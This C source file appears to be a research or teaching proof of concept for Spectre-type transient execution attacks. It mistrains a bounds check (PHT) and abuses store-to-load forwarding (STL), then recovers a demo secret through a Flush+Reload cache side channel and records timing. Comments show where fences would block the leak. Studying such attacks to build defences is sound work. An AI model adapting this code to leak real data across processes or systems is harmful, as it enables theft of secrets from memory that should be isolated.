#define _GNU_SOURCE
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef linux
  #include <sched.h>
#endif

#include "libcache/cacheutils.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"
#define OVERWRITE   '#'
#define likely(x)       __builtin_expect((x),1)
#define unlikely(x)     __builtin_expect((x),0)
#define MAX_DATA 10000

#define DATA_SECRET DATA SECRET

volatile int true = 1;
unsigned char data[128];

// Span large part of memory with jump if equal
#if defined(__i386__) || defined(__x86_64__)
#define JE asm volatile("je end");
#elif defined(__aarch64__)
#define JE asm volatile("beq end");
#endif
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

typedef struct memSetup{
  char *_mem;
  char leaked[sizeof(DATA_SECRET)+1];
} memSetup __attribute__((aligned(8)));

void oop() {
    #if defined(__i386__) || defined(__x86_64__)
    if(!true) true++;
    #elif defined(__aarch64__)
        if(true) true++;
    #endif
    JE_64K

    end:
    return;
}

typedef struct runData{
  uint64_t op_times[MAX_DATA];
  int ops;
  uint64_t start;
  uint64_t end;
} runData;

void addOpData(runData *r){
  r->op_times[r->ops++] = (r->end - r->start);
}

void analyseOpData(runData *r, FILE* fptr){
  uint64_t highest = r->op_times[0];
  uint64_t lowest = highest;
  uint64_t sum = 0;
  uint64_t tmp;
  for (int i =0; i < r->ops; i++){
    tmp = r->op_times[i];
    fprintf(fptr,"%u, ", r->op_times[i]);
    sum += tmp;
    if (tmp> highest){
      highest = tmp;
    }
    if (tmp < lowest){
      lowest = tmp;
    }
  }
  printf("cycles per byte read:\n -- highest: %7u \n",highest);
  printf(" -- lowest:  %7u \n -- average: %7u \n",lowest,(sum/r->ops));
}


// TODO: check size of data beforehand?
// access_array should not normally be able to access items outside of len
// but the spectre attack "allows us to"
char access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  flush(&len);
  flush(&x);
  
  // ensure data is flushed at this point
  mfence();

  // check that only accessible part (DATA) can be accessed
  if(unlikely((float)x / (float)len < 1)) {
    // countermeasure: add the fence here
    cache_encode(data[x]);
  }
}

void setup(memSetup *m){
  if(!CACHE_MISS) 
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n\n", CACHE_MISS);


  pagesize = sysconf(_SC_PAGESIZE);
  m->_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)m->_mem & ~(pagesize-1)) + pagesize * 2);

  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  memset(m->leaked, ' ', sizeof(m->leaked));
  m->leaked[sizeof(DATA_SECRET)] = 0;
}

typedef int8_t config_t;
// configuration parametres:
/*
  bit "indices":
  76543210

  0: mistraining type: 
    0 for congruent branch ("oop"), 1 for victim/shadow branch ("ip")
  1: address space:
    0 for same address space ("sa"), 1 for cross-address space ("ca")
  3,2: target component:
    00 for BTB
    01 for PHT
    10 for RSB
    11 for STL
*/

void train_oop(){
  for(int y = 0; y < 100; y++) {
    oop();
  }
}

void train_ip(){
  for(int y = 0; y < 10; y++) {
    access_array(0);
  }
}

void genPHTAtk(runData *r, memSetup *m, int *j){
  #if USE_RDTSC_BEGIN_END
      r->start = rdtsc_begin();
  #else
      r->start = rdtsc();
  #endif
  // potential out-of-bounds access
  access_array(*j);

  // only show inaccessible values (SECRET)
  if(*j >= sizeof(DATA) - 1) {
    mfence(); // avoid speculation
    cache_decode_pretty(m->leaked, *j);

    #if USE_RDTSC_BEGIN_END
    r->end = rdtsc_end();
    #else
      r->end = rdtsc();
    #endif
    addOpData(r);
  }
  sched_yield(); // why is the yield necessary?
}

void sa(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  trainer();
  genPHTAtk(r,m,j);
}

void ca(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  if(pid == 0) {
    trainer();
  }
  else {
    genPHTAtk(r,m,j);
  }
}

char accessSTL(int x){
  // store secret in data
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  mfence();
  char* dat_inter = &data[0];
  char** data_slowptr = &dat_inter;
  char*** data_slowslowptr = &data_slowptr;
  mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  // ensure data is flushed at this point
  mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*data_slowslowptr))[x] = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //mfence();
  // Encode stale value in the cache
  cache_encode(data[x]);
}

void stl(void (*trainer)(), runData *r, memSetup *m, int *j, pid_t pid){
  #if USE_RDTSC_BEGIN_END
      r->start = rdtsc_begin();
  #else
      r->start = rdtsc();
  #endif
  // overwrite value with X, then access
  accessSTL(*j);

  mfence(); // avoid speculation
  // Recover data from covert channel
  printf("[ ]  ");
  cache_decode_pretty(m->leaked, *j);

  #if USE_RDTSC_BEGIN_END
    r->end = rdtsc_end();
  #else
      r->end = rdtsc();
  #endif
  addOpData(r);

  sched_yield();
}